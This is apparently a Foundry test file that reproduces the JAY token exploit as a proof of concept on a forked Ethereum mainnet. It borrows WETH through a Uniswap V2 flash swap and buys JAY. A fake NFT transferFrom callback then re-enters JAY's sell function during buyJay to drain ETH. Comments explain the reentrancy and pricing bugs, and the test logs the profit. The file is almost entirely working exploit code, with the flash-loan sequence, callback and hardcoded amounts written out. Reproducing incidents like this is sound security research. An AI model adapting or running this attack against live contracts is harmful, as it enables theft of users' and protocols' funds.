// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "contract/Arbitrage.sol";

interface IPair {
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract JAYPocTest is Test {
    Arbitrage public arbitrage;
    IPair public lender;
    address public jay;
    address public weth;

    function setUp() public {
        // 0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6
        vm.createSelectFork("https://rpc.ankr.com/eth", 16288199);
        arbitrage = new Arbitrage();
        jay = 0xf2919D1D80Aff2940274014bef534f7791906FF2;
        // WETH-USDT
        lender = IPair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
        weth = lender.token0();
    }

    function testPocJAY() public {
        uint256 balance_before = address(this).balance;
        uint256 lend_amount = 72.5 ether;
        uint256 first_buy_amount = address(jay).balance / 1 ether * 1 ether + 1 ether;
        uint256 second_buy_amount = lend_amount - first_buy_amount;

        bytes[] memory payloads = new bytes[](6);
        // withdraw weth
        payloads[0] = abi.encode(weth, 0, abi.encodeWithSignature("withdraw(uint256)", lend_amount));
        // buy jay first
        /* 
         * JAY exchange equality judgment.
         * 1. set: A-> buy eth amount, B -> totalSupply, C -> jay eth balance
         * 2. buy: ETHtoJAY -> A * B / C
         * 3. sell: JAYtoETH -> (A * B / C) * ((C + A) / B + A * B / C)
         * 4. buy == sell: Ideally the amount of eth remain unchanged after a round of swap
         *
         * Due to `transaction fees` inside the contract, jay price is changing dynamically with little impact.
         * 1. buy: buyer get 97% jay, dev get 3% buy eth amount
         * 2. sell: buyer get 90% eth amount, dev get 3% eth amount
         */
        payloads[1] = abi.encode(
            jay,
            first_buy_amount,
            abi.encodeWithSignature(
                "buyJay(address[],uint256[],address[],uint256[],uint256[])",
                new address[](0),
                new uint256[](0),
                new address[](0),
                new uint256[](0),
                new uint256[](0)
            )
        );
        // buy jay second && sell jay first
        /*
         * bug 1: jay contract `buyJay` function executes any NFT transfer function, we can simulate a fake NFT contract and start up a reentry attack.
         * bug 2: The place where the reentry attack happens is during the buying process, and the `sell` function calculate the jay price by eth current balance.
         * So we can execute `buyJay` first, and then reentry `sell` function, which will use `buyJay` eth value and `totalSupply` has not changed(`buyJay` has not been completed yet).
         */
        address[] memory erc721_address_list = new address[](1);
        erc721_address_list[0] = address(this);
        uint256[] memory erc721_id_list = new uint256[](1);
        erc721_id_list[0] = 0;
        payloads[2] = abi.encode(
            jay,
            second_buy_amount,
            abi.encodeWithSignature(
                "buyJay(address[],uint256[],address[],uint256[],uint256[])",
                erc721_address_list,
                erc721_id_list,
                new address[](0),
                new uint256[](0),
                new uint256[](0)
            )
        );
        // sell jay second
        /* Currently `Arbitrage` does not support obtaining intermediate states as parameters.
         * So we must manually write code to simulate and calculate an approximate value.
         * Or debug this test to obtain an accurate value.
         */
        uint256 second_sell_amount = 4313025058290613910965927;
        payloads[3] = abi.encode(jay, 0, abi.encodeWithSignature("sell(uint256)", second_sell_amount));
        // repay loan
        uint256 repay_amount = lend_amount + lend_amount * 3 / (1000 - 3) + 1 wei;
        payloads[4] = abi.encode(weth, repay_amount, abi.encodeWithSignature("deposit()"));
        payloads[5] =
            abi.encode(weth, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));

        // exploit
        lender.swap(lend_amount, 0, address(this), abi.encode(blockhash(block.number - 1), 0, payloads));
        arbitrage.withdraw();
        console.log("Income:", address(this).balance - balance_before);
    }

    function transferFrom(address, address, uint256) public {
        bytes[] memory payloads = new bytes[](1);
        // withdraw weth
        payloads[0] =
            abi.encode(jay, 0, abi.encodeWithSignature("sell(uint256)", IERC20(jay).balanceOf(address(arbitrage))));
        arbitrage.run_no_check(abi.encode(blockhash(block.number - 1), 0, payloads));
    }

    function uniswapV2Call(address initiator, uint256 amount0, uint256, /* amount1 */ bytes calldata data) external {
        require(initiator == address(this), "Invalid initiator");
        require(msg.sender == address(lender), "Invalid lender");

        IERC20(weth).transfer(address(arbitrage), amount0);
        arbitrage.run(data);
    }

    receive() external payable {}
}
